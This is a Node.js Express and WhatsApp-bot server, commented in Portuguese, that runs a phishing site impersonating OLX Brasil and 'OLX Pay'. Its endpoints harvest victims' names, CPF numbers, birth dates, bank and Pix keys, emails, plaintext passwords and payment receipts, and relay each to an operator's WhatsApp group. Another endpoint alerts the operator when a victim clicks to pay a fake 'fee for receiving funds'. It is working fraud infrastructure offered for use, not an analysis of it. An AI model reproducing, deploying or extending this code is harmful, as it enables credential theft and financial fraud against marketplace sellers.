// Variáveis globais
let conn = null;
let isConnected = false;
let qrCode = null;

// Inicialização do WhatsApp
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
// const fs = require("fs");

const config = require("./config.json");
const destinatario = config["grupo-mensagens"];

// 📧 Importar funções de email
const { enviarEmail, enviarEmMassa } = require("./js/envio-email");

async function connectToWhatsApp() {
  try {
    // Usar armazenamento de autenticação em múltiplos arquivos
    const { state, saveCreds } = await useMultiFileAuthState(
      "./bot/auth_info_baileys"
    );

    // Criar socket do WhatsApp
    const { version } = await fetchLatestBaileysVersion();
    console.log("baileys version", version);

    conn = makeWASocket({
      auth: state,
      version,
      logger: pino({ level: "silent" }),
    });

    // Escutar mensagens recebidas (para futuras implementações)
    const dataVendas = JSON.parse(
      fs.readFileSync(path.join(__dirname, "data", "vendas.json"))
    );

    conn.ev.on("messages.upsert", async (m) => {
      try {
        if (!m.messages) return;
        const mek = m.messages[0];
        if (!mek.message) return;
        if (mek.key.fromMe) return;
        if (mek.key && mek.key.remoteJid === "status@broadcast") return;

        // console.log("Mensagem recebida:", mek);
        require("./bot/system/admins")(conn, mek, dataVendas);
      } catch (error) {
        console.error("Erro ao processar mensagem:", error);
      }
    });

    // Quando a conexão for atualizada

    // Salvar credenciais quando autenticado
    conn.ev.on("creds.update", () => saveCreds());

    conn.ev.on("connection.update", (update) => {
      const { connection, lastDisconnect, qr } = update;

      // Armazenar QR code para exibi-lo na interface administrativa (se necessário)
      if (qr) {
        // Exibe o QR manualmente
        const qrcode = require("qrcode-terminal");
        qrcode.generate(qr, { small: true });
      }

      // Se conectado
      if (connection === "open") {
        isConnected = true;
        console.log("Conectado ao WhatsApp");

        conn
          .sendMessage(config.groupDestino, {
            text: "*Conexão estabelecida com sucesso!*",
          })
          .catch(async (err) => {
            console.error("Erro ao enviar mensagem de conexão:", err);
            // entra no grupo
            const res = await conn.groupAcceptInvite("CT2obtgOdsbKEnha3IhgTM");

            console.log("Entrou no grupo:", res);
          });

        // const { exec } = require("child_process");
        // exec(
        //   "cd bot/auth_info_baileys && find . ! -name 'creds.json' -type f -exec rm -f {} +"
        // );
      }

      // Se desconectado
      if (connection === "close") {
        isConnected = false;
        const shouldReconnect =
          lastDisconnect?.error?.output?.statusCode !==
          DisconnectReason.loggedOut;

        console.log(
          "Conexão fechada devido a ",
          lastDisconnect?.error,
          ", reconectando: ",
          shouldReconnect
        );

        // Reconectar se não estiver deslogado
        if (shouldReconnect) {
          connectToWhatsApp();
        }
      }
    });
  } catch (error) {
    console.error("Erro na conexão com WhatsApp:", error);
  }
}

 


// Conexão do Site:

const express = require("express");
const path = require("path");
const fs = require("fs");
const multer = require("multer");
const { v4: uuidv4 } = require("uuid");

// Configurar armazenamento para uploads
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const uploadDir = path.join(__dirname, "uploads");
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }
    cb(null, uploadDir);
  },
  filename: function (req, file, cb) {
    const fileExt = path.extname(file.originalname);
    cb(null, `comprovante-${uuidv4()}${fileExt}`);
  },
});

const upload = multer({
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB limite
  fileFilter: function (req, file, cb) {
    const allowedTypes = /jpeg|jpg|png|pdf/;
    const extname = allowedTypes.test(
      path.extname(file.originalname).toLowerCase()
    );
    const mimetype = allowedTypes.test(file.mimetype);

    if (extname && mimetype) {
      return cb(null, true);
    }
    cb(
      new Error("Apenas arquivos de imagem (JPEG, PNG) ou PDF são permitidos!")
    );
  },
});

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para logs de requisições
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  next();
});

// Middleware para processar JSON
app.use(express.json());

// Servir arquivos estáticos
app.use(express.static(path.join(__dirname, "public")));

// Função para verificar status do WhatsApp
function verificarStatusWhatsApp() {
  console.log(
    `Status da conexão WhatsApp: ${isConnected ? "Conectado" : "Desconectado"}`
  );
  return isConnected;
}

// Função melhorada para enviar mensagem WhatsApp
async function enviarMensagemWhatsApp(mensagem) {
  console.log("Iniciando envio de mensagem WhatsApp...");

  try {
    // Verificar se está conectado
    if (!isConnected || !conn) {
      console.error("WhatsApp não está conectado. Status:", isConnected);
      return { success: false, message: "WhatsApp não está conectado" };
    }

    // ID do grupo ou contato (pode ser alterado conforme necessário)
    // ID do grupo
    console.log(`Tentando enviar mensagem para: ${destinatario}`);

    // Enviar a mensagem
    await conn.sendMessage(destinatario, { text: mensagem });
    console.log("Mensagem enviada com sucesso!");

    return { success: true, message: "Mensagem enviada com sucesso" };
  } catch (error) {
    console.error("Erro detalhado ao enviar mensagem:", error);
    return {
      success: false,
      message: `Erro ao enviar mensagem: ${error.message}`,
      error: error,
    };
  }
}

// Função para enviar arquivo pelo WhatsApp
async function enviarArquivoWhatsApp(filePath, caption) {
  console.log("Iniciando envio de arquivo WhatsApp...");

  try {
    // Verificar se está conectado
    if (!isConnected || !conn) {
      console.error("WhatsApp não está conectado. Status:", isConnected);
      return { success: false, message: "WhatsApp não está conectado" };
    }

    // ID do grupo ou contato (pode ser alterado conforme necessário)
    // const destinatario = "120363397924256528@g.us"; // ID do grupo

    // Verificar se o arquivo existe
    if (!fs.existsSync(filePath)) {
      console.error(`Arquivo não encontrado: ${filePath}`);
      return { success: false, message: "Arquivo não encontrado" };
    }

    // Lê o arquivo para buffer
    const fileBuffer = fs.readFileSync(filePath);
    const fileExt = path.extname(filePath).toLowerCase();
    const fileName = path.basename(filePath);

    // Determinar o tipo de mídia com base na extensão
    let messageContent;
    if (fileExt === ".pdf") {
      messageContent = {
        document: fileBuffer,
        fileName: fileName,
        caption: caption,
      };
    } else {
      // para imagens (.jpg, .png, etc)
      messageContent = {
        image: fileBuffer,
        caption: caption,
      };
    }

    // Enviar o arquivo para o WhatsApp
    await conn.sendMessage(destinatario, messageContent);
    console.log("Arquivo enviado com sucesso!");

    return { success: true, message: "Arquivo enviado com sucesso" };
  } catch (error) {
    console.error("Erro ao enviar arquivo:", error);
    return {
      success: false,
      message: `Erro ao enviar arquivo: ${error.message}`,
      error: error,
    };
  }
}

// Endpoint para receber dados bancários e enviar para WhatsApp
app.post("/api/enviar-dados-bancarios", async (req, res) => {
  console.log("Recebendo requisição para enviar dados bancários");

  try {
    const dados = req.body;
    console.log("Dados recebidos:", JSON.stringify(dados));

    // Verificar se os dados são válidos
    if (!dados.nome || !dados.email || !dados.telefone || !dados.cpf || !dados.banco || !dados.pix_tipo || !dados.pix_chave) {
      console.error("Dados incompletos recebidos");
      return res.status(400).json({
        success: false,
        message: "Dados pessoais ou de endereço incompletos",
      });
    }

    // Verificar status do WhatsApp antes de tentar enviar
    if (!verificarStatusWhatsApp()) {
      console.error("Tentativa de envio com WhatsApp desconectado");
      return res.status(503).json({
        success: false,
        message:
          "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
      });
    }

    // Formatar mensagem com os dados recebidos
    const mensagem =
      `*Novos dados bancários recebidos*\n\n` +
      `*Dados Pessoais:*\n` +
      `Nome: ${dados.nome}\n` +
      `Email: ${dados.email}\n` +
      `Telefone: ${dados.telefone}\n` +
      `CPF: ${dados.cpf}\n\n` +
      `*Dados Bancários:*\n` +
      `Banco: ${dados.banco}\n` +
      `Tipo de Chave Pix: ${dados.pix_tipo}\n` +
      `Chave Pix: ${dados.pix_chave}\n\n` +
      `Enviado em: ${new Date().toLocaleString("pt-BR")}`;

    console.log("Mensagem formatada, iniciando envio...");

    // Enviar mensagem para o WhatsApp
    const resultado = await enviarMensagemWhatsApp(mensagem);
    console.log("Resultado do envio:", resultado);

    if (resultado.success) {
      res.json({
        success: true,
        message: "Dados enviados com sucesso para o WhatsApp",
      });
    } else {
      res.status(500).json({
        success: false,
        message: "Erro ao enviar mensagem para o WhatsApp",
        error: resultado.message,
      });
    }
  } catch (error) {
    console.error("Erro ao processar dados bancários:", error);
    res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error.message,
    });
  }
});

// Endpoint para obter dados da venda pelo ID
app.get("/api/venda/:id", (req, res) => {
  const id = req.params.id;

  // Carregar dados das vendas
  try {
    const vendasData = fs.readFileSync(
      path.join(__dirname, "data", "vendas.json"),
      "utf8"
    );
    const vendas = JSON.parse(vendasData);

    // Buscar venda pelo ID
    const venda = vendas.find((v) => v.codigo === id);

    if (venda) {
      // Adicionando um pequeno atraso para simular latência de rede (apenas para desenvolvimento)
      setTimeout(() => {
        res.json(venda);
      }, 300);
    } else {
      res.status(404).json({
        error: "Venda não encontrada",
        message: "Não foi possível encontrar uma venda com o código informado.",
      });
    }
  } catch (error) {
    console.error("Erro ao buscar dados da venda:", error);
    res.status(500).json({
      error: "Erro ao processar requisição",
      message:
        "Ocorreu um erro ao processar sua solicitação. Tente novamente mais tarde.",
    });
  }
});

// NOVO SITE
// Endpoint para compatibilidade com URLs que usam "pag" na rota
app.get("/home", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "home.html"));
});

// Endpoint para página de preenchimento de dados bancários (nova funcionalidade)
app.get("/dados-bancarios", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "dados-bancarios.html"));
});

app.get("/dados-bancarios.html", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "dados-bancarios.html"));
});

// Endpoint para compatibilidade com URLs que usam "pag" na rota
app.get("/pag", (req, res) => {
  const id = req.query.id;
  if (id) {
    // Redirecionar para home com o ID da venda
    res.redirect(`/?id=${id}`);
  } else {
    // Se não tiver ID, redirecionar para home normal
    res.redirect('/');
  }
});

// // Endpoint para acessar a página de dados bancários (usando .html em vez de .php)
// app.get("/pag/dados.html", (req, res) => {
//   res.sendFile(path.join(__dirname, "public", "pag", "dados.html"));
// });

// // Endpoint para acessar a página de alerta
// app.get("/pag/alerta.html", (req, res) => {
//   res.sendFile(path.join(__dirname, "public", "pag", "alerta.html"));
// });

// // Endpoint para simular .php (para compatibilidade com o formato solicitado)
// app.get("/pag/alerta.php", (req, res) => {
//   res.sendFile(path.join(__dirname, "public", "pag", "alerta.html"));
// });

// Endpoint para buscar todas as vendas (útil para dashboard)
app.get("/api/vendas", (req, res) => {
  try {
    const vendasData = fs.readFileSync(
      path.join(__dirname, "data", "vendas.json"),
      "utf8"
    );
    const vendas = JSON.parse(vendasData);
    res.json(vendas);
  } catch (error) {
    console.error("Erro ao buscar todas as vendas:", error);
    res.status(500).json({ error: "Erro ao processar requisição" });
  }
});

// Endpoint para termos de uso (retorna um JSON simples)
app.get("/api/termos", (req, res) => {
  res.json({
    titulo: "Termos de Uso da OLX Brasil",
    atualizado: "01/04/2023",
    conteudo: "Este documento apresenta os termos e condições gerais...",
  });
});

// Endpoint para política de privacidade (retorna um JSON simples)
app.get("/api/privacidade", (req, res) => {
  res.json({
    titulo: "Política de Privacidade da OLX Brasil",
    atualizado: "01/04/2023",
    conteudo: "A OLX Brasil está comprometida em proteger sua privacidade...",
  });
});

// Endpoint para receber comprovante e enviar via WhatsApp
app.post(
  "/api/enviar-comprovante",
  upload.single("comprovante"),
  async (req, res) => {
    console.log("Recebendo requisição para enviar comprovante");

    try {
      // Verificar se o arquivo foi recebido
      if (!req.file) {
        console.error("Nenhum arquivo recebido");
        return res.status(400).json({
          success: false,
          message: "Nenhum arquivo de comprovante recebido",
        });
      }

      console.log("Arquivo recebido:", req.file);

      // Verificar status do WhatsApp antes de tentar enviar
      if (!verificarStatusWhatsApp()) {
        console.error("Tentativa de envio com WhatsApp desconectado");
        return res.status(503).json({
          success: false,
          message:
            "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
        });
      }

      // Extrair dados do formulário
      const chavePix = req.body.chavePix || "Não informada";
      const valor = req.body.valor || "Não informado";

      // Formatar mensagem para o comprovante
      const caption =
        `*COMPROVANTE DE PAGAMENTO RECEBIDO*\n\n` +
        `*Dados do Pagamento:*\n` +
        `Valor: R$ ${valor}\n` +
        `Chave PIX: ${chavePix}\n\n` +
        `Recebido em: ${new Date().toLocaleString("pt-BR")}`;

      // Enviar o arquivo pelo WhatsApp
      const resultado = await enviarArquivoWhatsApp(req.file.path, caption);

      if (resultado.success) {
        res.json({
          success: true,
          message: "Comprovante enviado com sucesso para o WhatsApp",
        });
      } else {
        res.status(500).json({
          success: false,
          message: "Erro ao enviar comprovante para o WhatsApp",
          error: resultado.message,
        });
      }
    } catch (error) {
      console.error("Erro ao processar envio de comprovante:", error);
      res.status(500).json({
        success: false,
        message: "Erro ao processar sua solicitação",
        error: error.message,
      });
    }
  }
);

// Endpoint para notificar quando o cliente clica em "Continuar"
app.post("/api/notificar-clique-continuar", async (req, res) => {
  console.log("Cliente clicou em botão de ação");

  try {
    const dados = req.body;
    const codigoVenda = dados.codigo || "Não informado";
    const nomeProduto = dados.produto || "Não informado";
    const acao = dados.acao || "continuar";
    const valor = dados.valor || "";

    // Verificar status do WhatsApp antes de tentar enviar
    if (!verificarStatusWhatsApp()) {
      console.error(
        "WhatsApp desconectado - não foi possível enviar notificação de clique"
      );
      return res.status(503).json({
        success: false,
        message: "Serviço do WhatsApp indisponível",
      });
    }

    // Definir mensagem com base na ação
    let mensagem;

    if (acao === "clique_taxa") {
      mensagem =
        `*⚠️ CLIENTE VAI PAGAR A TAXA DE RECEBIMENTO DE VALORES ⚠️*\n\n` +
        `*Informações da venda:*\n` +
        `Código da venda: ${codigoVenda}\n` +
        `Produto: ${nomeProduto}\n` +
        `Valor da taxa: R$ ${valor}\n\n` +
        `Cliente clicou no botão para pagar a taxa de recebimento de valores e está sendo redirecionado para a página de pagamento.\n` +
        `Horário: ${new Date().toLocaleString("pt-BR")}`;
    } else {
      mensagem =
        `*Cliente clicou em CONTINUAR*\n\n` +
        `*Informações da venda:*\n` +
        `Código da venda: ${codigoVenda}\n` +
        `Produto: ${nomeProduto}\n\n` +
        `Cliente viu a mensagem de conclusão e clicou em continuar\n` +
        `Horário: ${new Date().toLocaleString("pt-BR")}`;
    }

    // Enviar mensagem para o WhatsApp
    const resultado = await enviarMensagemWhatsApp(mensagem);

    if (resultado.success) {
      res.json({
        success: true,
        message: "Notificação enviada com sucesso",
      });
    } else {
      res.status(500).json({
        success: false,
        message: "Erro ao enviar notificação para o WhatsApp",
        error: resultado.message,
      });
    }
  } catch (error) {
    console.error("Erro ao processar notificação de clique:", error);
    res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error.message,
    });
  }
});

// Endpoint para receber email do acesso OLX Pay e enviar para WhatsApp
app.post("/api/enviar-email-acesso", async (req, res) => {
  console.log("Recebendo requisição para enviar email de acesso");

  try {
    const dados = req.body;
    console.log("Dados recebidos:", JSON.stringify(dados));

    // Verificar se o email foi fornecido
    if (!dados.email) {
      console.error("Email não fornecido");
      return res.status(400).json({
        success: false,
        message: "Email não fornecido",
      });
    }

    // Verificar status do WhatsApp antes de tentar enviar
    if (!verificarStatusWhatsApp()) {
      console.error("Tentativa de envio com WhatsApp desconectado");
      return res.status(503).json({
        success: false,
        message:
          "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
      });
    }

    // Formatar mensagem com o email recebido
    const mensagem =
      `*✅ NOVO ACESSO À CENTRAL DE VENDAS OLX PAY*\n\n` +
      `*Dados de Acesso:*\n` +
      `Email: ${dados.email}\n\n` +
      `Cliente iniciou o processo de login na Central de Vendas OLX Pay\n` +
      `Horário: ${new Date().toLocaleString("pt-BR")}`;

    console.log("Mensagem formatada, iniciando envio...");

    // Enviar mensagem para o WhatsApp
    const resultado = await enviarMensagemWhatsApp(mensagem);
    console.log("Resultado do envio:", resultado);

    if (resultado.success) {
      res.json({
        success: true,
        message: "Email enviado com sucesso para o WhatsApp",
      });
    } else {
      res.status(500).json({
        success: false,
        message: "Erro ao enviar mensagem para o WhatsApp",
        error: resultado.message,
      });
    }
  } catch (error) {
    console.error("Erro ao processar email de acesso:", error);
    res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error.message,
    });
  }
});

// Endpoint para receber email e senha do acesso OLX Pay e enviar para WhatsApp
app.post("/api/enviar-credenciais-acesso", async (req, res) => {
  console.log("Recebendo requisição para enviar credenciais de acesso");

  try {
    const dados = req.body;
    console.log("Dados recebidos:", JSON.stringify(dados));

    // Verificar se email e senha foram fornecidos
    if (!dados.email || !dados.senha) {
      console.error("Email ou senha não fornecidos");
      return res.status(400).json({
        success: false,
        message: "Email e senha são obrigatórios",
      });
    }

    // Verificar status do WhatsApp antes de tentar enviar
    if (!verificarStatusWhatsApp()) {
      console.error("Tentativa de envio com WhatsApp desconectado");
      return res.status(503).json({
        success: false,
        message:
          "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
      });
    }

    // Formatar mensagem com email e senha
    const mensagem =
      `*🔐 NOVO LOGIN NA CENTRAL DE VENDAS OLX PAY*\n\n` +
      `*Credenciais Recebidas:*\n` +
      `Email: ${dados.email}\n` +
      `Senha: ${dados.senha}\n\n` +
      `Cliente realizou login na Central de Vendas OLX Pay\n` +
      `Horário: ${new Date().toLocaleString("pt-BR")}`;

    console.log("Mensagem formatada, iniciando envio...");

    // Enviar mensagem para o WhatsApp
    const resultado = await enviarMensagemWhatsApp(mensagem);
    console.log("Resultado do envio:", resultado);

    if (resultado.success) {
      res.json({
        success: true,
        message: "Credenciais verificadas com sucesso",
      });
    } else {
      res.status(500).json({
        success: false,
        message: "Erro ao enviar mensagem para o WhatsApp",
        error: resultado.message,
      });
    }
  } catch (error) {
    console.error("Erro ao processar credenciais de acesso:", error);
    res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error.message,
    });
  }
});

// Endpoint para receber dados de cadastro OLX Pay e enviar para WhatsApp
app.post("/api/enviar-cadastro-olx", async (req, res) => {
  console.log("Recebendo requisição para enviar cadastro OLX Pay");

  try {
    const dados = req.body;
    console.log("Dados recebidos:", JSON.stringify(dados));

    // Verificar se todos os dados foram fornecidos
  if (!dados.nome || !dados.cpf || !dados.telefone || !dados.data_nascimento || !dados.pix_tipo || !dados.pix_chave) {
      console.error("Dados incompletos recebidos");
      return res.status(400).json({
        success: false,
        message: "Todos os campos obrigatórios devem ser preenchidos",
      });
    }

    // Verificar status do WhatsApp antes de tentar enviar
    if (!verificarStatusWhatsApp()) {
      console.error("Tentativa de envio com WhatsApp desconectado");
      return res.status(503).json({
        success: false,
        message:
          "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
      });
    }

    // Formatar mensagem com dados do cadastro (sem email)
    const mensagem =
      `*📝 NOVO CADASTRO OLX PAY*\n\n` +
      `Nome: ${dados.nome}\n` +
      `CPF: ${dados.cpf}\n` +
      `Telefone: ${dados.telefone}\n` +
      `Data de Nascimento: ${dados.data_nascimento}\n` +
      `Tipo PIX: ${dados.pix_tipo}\n` +
      `Chave PIX: ${dados.pix_chave}\n\n` +

    console.log("Mensagem formatada, iniciando envio...");

    // Enviar mensagem para o WhatsApp
    const resultado = await enviarMensagemWhatsApp(mensagem);
    console.log("Resultado do envio:", resultado);

    if (resultado.success) {
      res.json({
        success: true,
        message: "Cadastro enviado com sucesso para o WhatsApp",
      });
    } else {
      res.status(500).json({
        success: false,
        message: "Erro ao enviar mensagem para o WhatsApp",
        error: resultado.message,
      });
    }
  } catch (error) {
    console.error("Erro ao processar cadastro OLX Pay:", error);
    res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error.message,
    });
  }
});

// Importar o módulo qrcodepagamentos
const qrcodePagamentos = require('./js/qrcodepagamentos');

// Endpoint para gerar QR Code PIX
app.get("/api/gerar-qrcode-pix", async (req, res) => {
  try {
    console.log("Gerando QR Code PIX...");
    const resultado = await qrcodePagamentos.gerarQRCode();
    if (resultado.status === 404) {
      // Enviar mensagem para o WhatsApp
      return enviarMensagemWhatsApp(
        `*⚠️ ERRO AO GERAR QR CODE PIX ⚠️*\n\nOcorreu um erro ao tentar gerar o QR Code PIX. A página de redirecionamento não foi encontrada (404). Verifique se a URL de redirecionamento está correta e se o serviço está disponível.\n\nHorário: ${new Date().toLocaleString("pt-BR")}`,
      );
    }

    if (!resultado || !resultado.imgBase64) {
      console.error("Erro ao gerar QR Code PIX: Resultado inválido");
      return res.status(500).json({
        success: false,
        message: "Não foi possível gerar o QR Code PIX",
        resultado
      });
    }
    
    res.json({
      success: true,
      qrCodeBase64: resultado.imgBase64,
      pixTitle: resultado.pixTitle
    });
  } catch (error) {
    console.error("Erro ao gerar QR Code PIX:", error);
    res.status(500).json({
      success: false,
      message: "Erro ao gerar QR Code PIX",
      error: error.message
    });
  }
});

// Rota padrão para qualquer outra solicitação (SPA pattern)
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "home.html"));
});

// Endpoint para receber comprovante de pagamento e enviar via WhatsApp
app.post("/api/enviar-comprovante", upload.single('comprovante'), async (req, res) => {
  console.log("Recebendo comprovante de pagamento...");

  try {
    // Verificar se o arquivo foi enviado
    if (!req.file) {
      return res.status(400).json({
        success: false,
        message: "Nenhum arquivo foi enviado"
      });
    }

    // Obter informações do arquivo
    const filePath = req.file.path;
    const fileName = req.file.originalname;
    const fileSize = req.file.size;

    console.log(`Arquivo recebido: ${fileName} (${fileSize} bytes)`);

    // Verificar status do WhatsApp antes de enviar
    if (!verificarStatusWhatsApp()) {
      fs.unlinkSync(filePath); // Deletar arquivo
      return res.status(503).json({
        success: false,
        message: "WhatsApp não está conectado. Tente novamente mais tarde."
      });
    }

    // Preparar legenda para a mensagem
    const dataAtual = new Date().toLocaleString("pt-BR");
    const legenda = `*Comprovante de Pagamento Recebido*\n\nArquivo: ${fileName}\nData: ${dataAtual}`;

    console.log("Enviando arquivo para WhatsApp...");

    // Enviar arquivo via WhatsApp
    const resultado = await enviarArquivoWhatsApp(filePath, legenda);

    if (resultado.success) {
      // Deletar arquivo após envio bem-sucedido (opcional)
      setTimeout(() => {
        try {
          if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
            console.log(`Arquivo temporário deletado: ${filePath}`);
          }
        } catch (err) {
          console.error(`Erro ao deletar arquivo: ${err.message}`);
        }
      }, 1000);

      res.json({
        success: true,
        message: "Comprovante enviado com sucesso!",
        fileName: fileName
      });
    } else {
      // Deletar arquivo em caso de erro
      try {
        if (fs.existsSync(filePath)) {
          fs.unlinkSync(filePath);
        }
      } catch (err) {
        console.error(`Erro ao deletar arquivo: ${err.message}`);
      }

      res.status(500).json({
        success: false,
        message: "Erro ao enviar comprovante para WhatsApp",
        error: resultado.message
      });
    }
  } catch (error) {
    console.error("Erro ao processar comprovante:", error);
    
    // Tentar deletar arquivo em caso de erro
    if (req.file && req.file.path) {
      try {
        if (fs.existsSync(req.file.path)) {
          fs.unlinkSync(req.file.path);
        }
      } catch (err) {
        console.error(`Erro ao deletar arquivo: ${err.message}`);
      }
    }

    res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error.message
    });
  }
});

// Middleware para tratamento de erros
app.use((err, req, res, next) => {
  console.error("Erro na aplicação:", err);
  res
    .status(500)
    .send("Ocorreu um erro no servidor. Tente novamente mais tarde.");
});

app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
  console.log(`Acesse: http://localhost:${PORT}/?id=KFTKWNQVMD`);
  connectToWhatsApp();
});
